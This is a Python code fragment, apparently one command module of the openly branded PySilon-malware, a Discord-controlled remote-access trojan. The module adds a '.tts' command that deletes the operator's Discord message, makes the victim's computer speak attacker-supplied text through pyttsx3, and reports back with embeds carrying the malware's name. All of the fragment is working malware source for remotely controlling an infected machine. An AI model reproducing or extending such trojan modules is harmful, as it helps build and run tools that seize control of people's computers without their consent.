#<imports>
import pyttsx3
import discord
#</imports>


@client.command(name="tts")
async def text_to_speech(ctx, what_to_say=None):
    await ctx.message.delete()
    if what_to_say != None:
        what_to_say = ctx.message.content[5:]
        engine = pyttsx3.init()
        engine.setProperty('rate', 150) 
        engine.say(str(what_to_say))
        engine.runAndWait()
        engine.stop()
        embed = discord.Embed(title="🟢 Success",description=f'```Successfully played TTS message: "{what_to_say}"```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)